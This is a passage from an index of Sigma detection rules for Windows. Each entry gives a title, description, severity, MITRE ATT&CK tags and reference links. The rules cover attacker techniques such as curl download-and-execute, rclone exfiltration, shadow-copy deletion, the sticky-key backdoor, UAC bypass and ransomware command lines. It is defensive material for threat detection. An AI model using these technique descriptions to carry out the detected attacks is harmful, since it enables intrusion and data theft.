    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) 


    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_gotoopener.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-4---gotoassist-files-detected-test-on-windows

    
### Query Tor Onion Address
    
    Detects DNS resolution of an .onion address related to Tor routing networks

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1090.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_tor_onion.yml
* https://www.logpoint.com/en/blog/detecting-tor-use-with-logpoint/

    
### Suspicious Cobalt Strike DNS Beaconing
    
    Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons

    * Level: critical
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_mal_cobaltstrike.yml
* https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns

* https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/

    
### DNS HybridConnectionManager Service Bus
    
    Detects Azure Hybrid Connection Manager services querying the Azure service bus service

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1554
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/dns_query/dns_query_win_hybridconnectionmgr_servicebus.yml
* https://twitter.com/Cyb3rWard0g/status/1381642789369286662

    
### Suspicious Driver Install by pnputil.exe
    
    Detects when a possible suspicious driver is being installed via pnputil.exe lolbin

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbins_susp_driver_installed_by_pnputil.yml
* https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/pnputil-command-syntax

* https://strontic.github.io/xcyclopedia/library/pnputil.exe-60EDC5E6BDBAEE441F2E3AEACD0340D2.html

    
### Regsvr32 Flags Anomaly
    
    Detects a flag anomaly in which regsvr32.exe uses a /i flag without using a /n flag at the same time

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_regsvr32_flags_anomaly.yml
* https://twitter.com/sbousseaden/status/1282441816986484737?s=12

    
### Code Execution via Pcwutl.dll
    
    Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_pcwutl.yml
* https://github.com/api0cradle/LOLBAS/blob/master/OSLibraries/Pcwutl.md

* https://twitter.com/harr0ey/status/989617817849876488

    
### Curl Start Combination
    
    Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1218
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_curl_start_combo.yml
* https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983

    
### Mustang Panda Dropper
    
    Detects specific process parameters as used by Mustang Panda droppers

    * Level: high
    * MITRE: attack.t1587.001
    * MITRE: attack.resource_development
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_mustangpanda.yml
* https://app.any.run/tasks/7ca5661d-a67b-43ec-98c1-dd7a8103c256/

* https://app.any.run/tasks/b12cccf3-1c22-4e28-9d3e-c7a6062f3914/

* https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations

    
### Turla Group Commands May 2020
    
    Detects commands used by Turla group as reported by ESET in May 2020

    * Level: critical
    * MITRE: attack.g0010
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.t1053.005
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_turla_comrat_may20.yml
* https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf

    
### Suspicious TSCON Start as SYSTEM
    
    Detects a tscon.exe start as LOCAL SYSTEM

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_tscon_localsystem.yml
* http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html

* https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6

* https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement

    
### File or Folder Permissions Modifications
    
    Detects a file or folder's permissions being modified.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1222.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_file_permission_modifications.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.001/T1222.001.md

    
### Detecting Fake Instances Of Hxtsr.exe
    
    HxTsr.exe is a Microsoft compressed executable file called Microsoft Outlook Communications.HxTsr.exe is part of Outlook apps, because it resides in a hidden "WindowsApps" subfolder of "C:\Program Files". Its path includes a version number, e.g., "C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_17.7466.41167.0_x64__8wekyb3d8bbwe\HxTsr.exe". Any instances of hxtsr.exe not in this folder may be malware camouflaging itself as HxTsr.exe

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_detecting_fake_instances_of_hxtsr.yml
    
### Explorer Root Flag Process Tree Break
    
    Detects a command line process that uses explorer.exe /root, which is similar to cmd.exe /c, only it breaks the process tree and makes its parent a new instance of explorer

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_explorer_break_proctree.yml
* https://twitter.com/CyberRaiju/status/1273597319322058752

* https://twitter.com/bohops/status/1276357235954909188?s=12

    
### Procdump Evasion
    
    Detects uses of the SysInternals Procdump utility in which procdump or its output get renamed or a dump file is moved ot copied to a different name

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_procdump_evasion.yml
* https://twitter.com/mrd0x/status/1480785527901204481

    
### Powershell Defender Exclusion
    
    Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_defender_exclusion.yml
* https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-test

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

* https://twitter.com/AdamTheAnalyst/status/1483497517119590403

    
### Rclone Execution via Command Line or PowerShell
    
    Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc

    * Level: high
    * MITRE: attack.exfiltration
    * MITRE: attack.t1567.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rclone_execution.yml
* https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/

* https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware

* https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a

* https://labs.sentinelone.com/egregor-raas-continues-the-chaos-with-cobalt-strike-and-rclone

* https://www.splunk.com/en_us/blog/security/darkside-ransomware-splunk-threat-update-and-detections.html

    
### Suspicious Extrac32 Alternate Data Stream Execution
    
    Extract data from cab file and hide it in an alternate data stream

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbas_extrac32_ads.yml
* https://lolbas-project.github.io/lolbas/Binaries/Extrac32/

    
### Suspicious Control Panel DLL Load
    
    Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_control_dll_load.yml
* https://twitter.com/rikvduijn/status/853251879320662017

    
### Rar Usage with Password and Compression Level
    
    Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions.

    * Level: high
    * MITRE: attack.collection
    * MITRE: attack.t1560.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rar_flags.yml
* https://labs.sentinelone.com/the-anatomy-of-an-apt-attack-and-cobaltstrike-beacons-encoded-configuration/

* https://ss64.com/bash/rar.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md

    
### Data Compressed - rar.exe
    
    An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.t1560.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_data_compressed_with_rar.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md

* https://eqllib.readthedocs.io/en/latest/analytics/1ec33c93-3d0b-4a28-8014-dbdaae5c60ae.html

    
### Suspicious Network Command
    
    Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1016
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_network_command.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md#atomic-test-1---system-network-configuration-discovery-on-windows

    
### WhoAmI as Parameter
    
    Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato)

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1033
    * MITRE: car.2016-03-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_whoami_as_param.yml
* https://twitter.com/blackarrowsec/status/1463805700602224645?s=12

    
### DLL Execution via Rasautou.exe
    
    Detects using Rasautou.exe for loading arbitrary .DLL specified in -d option and executes the export specified in -p.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_rasautou_dll_execution.yml
* https://lolbas-project.github.io/lolbas/Binaries/Rasautou/

* https://github.com/fireeye/DueDLLigence

* https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html

    
### Suspicious WMIC ActiveScriptEventConsumer Creation
    
    Detects WMIC executions in which a event consumer gets created in order to establish persistence

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1546.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_wmic_eventconsumer_create.yml
* https://twitter.com/johnlatwc/status/1408062131321270282?s=12

* https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf

    
### Suspicious Sc Query
    
    Adversaries may try to get information about registered services

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_sc_query.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1007/T1007.md#atomic-test-1---system-service-discovery

    
### Execute Code with Pester.bat
    
    Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_pester.yml
* https://twitter.com/Oddvarmoe/status/993383596244258816

    
### Renamed SysInternals Debug View
    
    Detects suspicious renamed SysInternals DebugView execution

    * Level: high
    * MITRE: attack.resource_development
    * MITRE: attack.t1588.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_renamed_debugview.yml
* https://www.epicturla.com/blog/sysinturla

    
### Lazarus Activity
    
    Detects different process creation events as described in Malwarebytes's threat report on Lazarus group activity

    * Level: critical
    * MITRE: attack.g0032
    * MITRE: attack.execution
    * MITRE: attack.t1106
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_lazarus_activity_apr21.yml
* https://blog.malwarebytes.com/malwarebytes-news/2021/04/lazarus-apt-conceals-malicious-code-within-bmp-file-to-drop-its-rat/

    
### Suspicious Userinit Child Process
    
    Detects a suspicious child process of userinit

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_userinit_child.yml
* https://twitter.com/SBousseaden/status/1139811587760562176

    
### Ilasm Lolbin Use Compile C-Sharp
    
    Detect use of Ilasm.exe to compile c# code into dll or exe.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1127
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbin_ilasm.yml
* https://lolbas-project.github.io/lolbas/Binaries/Ilasm/

* https://www.echotrail.io/insights/search/ilasm.exe

    
### MSTSC Shadowing
    
    Detects RDP session hijacking by using MSTSC shadowing

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1563.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_rdp_hijack_shadowing.yml
* https://twitter.com/kmkz_security/status/1220694202301976576

* https://github.com/kmkz/Pentesting/blob/master/Post-Exploitation-Cheat-Sheet

    
### Execution via WorkFolders.exe
    
    Detects using WorkFolders.exe to execute an arbitrary control.exe

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_workfolders.yml
* https://twitter.com/elliotkillick/status/1449812843772227588

    
### CrackMapExecWin
    
    Detects CrackMapExecWin Activity as Described by NCSC

    * Level: critical
    * MITRE: attack.g0035
    * MITRE: attack.credential_access
    * MITRE: attack.discovery
    * MITRE: attack.t1110
    * MITRE: attack.t1087
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_dragonfly.yml
* https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control

* https://attack.mitre.org/software/S0488/

    
### LockerGoga Ransomware
    
    Detects LockerGoga Ransomware command line.

    * Level: critical
    * MITRE: attack.impact
    * MITRE: attack.t1486
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mal_lockergoga_ransomware.yml
* https://medium.com/@malwaredancer/lockergoga-input-arguments-ipc-communication-and-others-bd4e5a7ba80a

* https://blog.f-secure.com/analysis-of-lockergoga-ransomware/

* https://www.carbonblack.com/blog/tau-threat-intelligence-notification-lockergoga-ransomware/

    
### Overwrite Deleted Data with Cipher
    
    Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.
Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives


    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1485
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_cipher.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md#atomic-test-3---overwrite-deleted-data-on-c-drive

    
### Replace.exe Usage
    
    Detects the use of Replace.exe which can be used to replace file with another file

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbas_replace.yml
* https://lolbas-project.github.io/lolbas/Binaries/Replace/

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/replace

    
### Possible InstallerFileTakeOver LPE CVE-2021-41379
    
    Detects signs of the exploitation of LPE CVE-2021-41379 to spawn a cmd.exe with LOCAL_SYSTEM rights

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exploit_lpe_cve_2021_41379.yml
* https://github.com/klinix5/InstallerFileTakeOver

* https://www.zerodayinitiative.com/advisories/ZDI-21-1308/

    
### Netsh Program Allowed with Suspcious Location
    
    Detects Netsh commands that allows a suspcious application location on Windows Firewall

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_netsh_fw_add_susp_image.yml
* https://www.virusradar.com/en/Win32_Kasidet.AD/description

* https://www.hybrid-analysis.com/sample/07e789f4f2f3259e7559fdccb36e96814c2dbff872a21e1fa03de9ee377d581f?environmentId=100

    
### Suspicious Execution of InstallUtil Without Log
    
    Uses the .NET InstallUtil.exe application in order to execute image without log

    * Level: medium
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_instalutil.yml
* https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/

* https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool

    
### Hacktool by Cube0x0
    
    Detects the use of tools created by a well-known hacktool producer named Cube0x0, which includes his handle in all binaries as company information in the PE headers (SharpPrintNightmare, KrbRelay, SharpMapExec etc.)

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hack_cube0x0_tools.yml
* https://github.com/cube0x0

* https://www.virustotal.com/gui/search/metadata%253ACube0x0/files

    
### Suspicious Desktopimgdownldr Command
    
    Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_desktopimgdownldr.yml
* https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/

* https://twitter.com/SBousseaden/status/1278977301745741825

    
### Suspicious SYSTEM User Process Creation
    
    Detects a suspicious process creation as SYSTEM user (suspicious program or command line parameter)

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_system_user_anomaly.yml
* Internal Research

* https://tools.thehacker.recipes/mimikatz/modules

    
### Shadow Copies Deletion Using Operating Systems Utilities
    
    Shadow Copies deletion using operating systems utilities

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.impact
    * MITRE: attack.t1070
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_shadow_copies_deletion.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

* https://blog.talosintelligence.com/2017/05/wannacry.html

* https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/

* https://www.bleepingcomputer.com/news/security/why-everyone-should-disable-vssadmin-exe-now/

* https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100

* https://github.com/Neo23x0/Raccine#the-process

* https://github.com/Neo23x0/Raccine/blob/main/yara/gen_ransomware_command_lines.yar

* https://redcanary.com/blog/intelligence-insights-october-2021/

    
### Scheduled Task Creation
    
    Detects the creation of scheduled tasks in user session

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1053.005
    * MITRE: attack.s0111
    * MITRE: car.2013-08-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_schtask_creation.yml
    
### CVE-2021-40444 Process Pattern
    
    Detects a suspicious process pattern found in CVE-2021-40444 exploitation

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_control_cve_2021_40444.yml
* https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444

* https://twitter.com/neonprimetime/status/1435584010202255375

* https://www.joesandbox.com/analysis/476188/1/iochtml

    
### SyncAppvPublishingServer Execute Arbitrary PowerShell Code
    
    Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_syncappvpublishingserver_execute_powershell.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md

* https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/

    
### Exploit for CVE-2015-1641
    
    Detects Winword starting uncommon sub process MicroScMgmt.exe as used in exploits for CVE-2015-1641

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exploit_cve_2015_1641.yml
* https://www.virustotal.com/en/file/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8/analysis/

* https://www.hybrid-analysis.com/sample/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8?environmentId=100

    
### Service Execution
    
    Detects manual service execution (start) via system utilities.

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_service_execution.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md

    
### Suspicious Curl Change User Agents
    
    Detects a suspicious curl process start on Windows with set useragent options

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_curl_useragent.yml
* https://curl.se/docs/manpage.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1071.001/T1071.001.md#atomic-test-2---malicious-user-agents---cmd

    
### FromBase64String Command Line
    
    Detects suspicious FromBase64String expressions in command line arguments

    * Level: high
    * MITRE: attack.t1027
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1140
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_frombase64string.yml
* https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639

    
### System File Execution Location Anomaly
    
    Detects a Windows program executable started in a suspicious folder

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_system_exe_anomaly.yml
* https://twitter.com/GelosSnake/status/934900723426439170

    
### Possible Privilege Escalation via Service Permissions Weakness
    
    Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1574.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_possible_privilege_escalation_via_service_reg_perm.yml
* https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment

* https://pentestlab.blog/2017/03/31/insecure-registry-permissions/

    
### Sticky-Key Backdoor Copy Cmd.exe
    
    By replacing the sticky keys executable with the local admins CMD executable, an attacker is able to access a privileged windows console session without authenticating to the system. When the sticky keys are "activated" the privilleged shell is launched.

    * Level: medium
    * MITRE: attack.t1546.008
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_sticky_keys_unauthenticated_privileged_cmd_access.yml
* https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html

* https://www.clearskysec.com/wp-content/uploads/2020/02/ClearSky-Fox-Kitten-Campaign-v1.pdf

    
### CHCP CodePage Locale Lookup
    
    Detects use of chcp to look up the system locale value as part of host discovery

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1614.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_codepage_lookup.yml
* https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/chcp

    
### Windows Crypto Mining Indicators
    
    Detects command line parameters or strings often used by crypto miners

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1496
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_crypto_mining_monero.yml
* https://www.poolwatch.io/coin/monero

    
### Baby Shark Activity
    
    Detects activity that could be related to Baby Shark malware

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.003
    * MITRE: attack.t1059.001
    * MITRE: attack.discovery
    * MITRE: attack.t1012
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_babyshark.yml
* https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/

    
### Execution Of Non-Existing File
    
    Checks whether the image specified in a process creation event is not a full, absolute path (caused by process ghosting or other unorthodox methods to start a process)

    * Level: high
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_image_missing.yml
* https://pentestlaboratories.com/2021/12/08/process-ghosting/

    
### Netsh Allow Group Policy on Microsoft Defender Firewall
    
    Adversaries may  modify system firewalls in order to bypass controls limiting network usage

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_netsh_fw_enable_group_rule.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-3---allow-smb-and-rdp-on-microsoft-defender-firewall

* https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior

    
### XSL Script Processing
    
    Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. Rule detects when adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1220
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_xsl_script_processing.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.md

    
### Advanced IP Scanner
    
    Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups.

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1046
    * MITRE: attack.t1135
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_advanced_ip_scanner.yml
* https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/

* https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html

* https://labs.f-secure.com/blog/prelude-to-ransomware-systembc

* https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf

* https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer

* https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20IP%20Scanner

    
### UAC Bypass Using Windows Media Player - Process
    
    Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_wmp.yml
* https://github.com/hfiref0x/UACME

    
### Modifies the Registry From a ADS
    
    Detects the import of an alternate data stream with regini.exe, regini.exe can be used to modify registry keys.

    * Level: high
    * MITRE: attack.t1112
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_regini_ads.yml
